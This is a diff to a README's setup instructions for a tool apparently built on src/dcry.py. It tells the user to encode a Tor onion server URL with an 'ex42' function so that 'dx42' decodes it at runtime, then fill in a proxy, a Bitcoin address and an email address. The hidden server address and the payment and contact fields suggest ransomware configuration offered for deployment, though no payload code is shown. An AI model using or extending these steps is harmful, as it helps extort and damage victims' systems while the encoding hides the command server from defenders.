@@ -49,11 +49,17 @@ pip install -r requirements-client.txt
 
 1. Open [`src/dcry.py`](src/dcry.py)
 
-   * Replace `YOUR_URL` with your encoded URL using `dx42`:
-
-   ```python
-   YOUR_URL = dx42(encoded_url).decode()
-   ```
+  * Replace the `YOUR_URL` variable with the encoded URL using the `dx42` function like this:
+    ```python
+    YOUR_URL = dx42(b"YOUR_ENCODED_URL").decode()
+    ```
+    (Use the `ex42` function from the `edx42` module to encode your URL first.)
+    
+    Example:
+    ```python
+    encoded_url = ex42(b"https://your-tor-server.onion")
+    YOUR_URL = dx42(encoded_url).decode()
+    ```
 
    * Replace `YOUR_PROXY`, `YOUR_BITCOIN_ADDRESS`, `YOUR_EMAIL_ADDRESS` similarly.
 
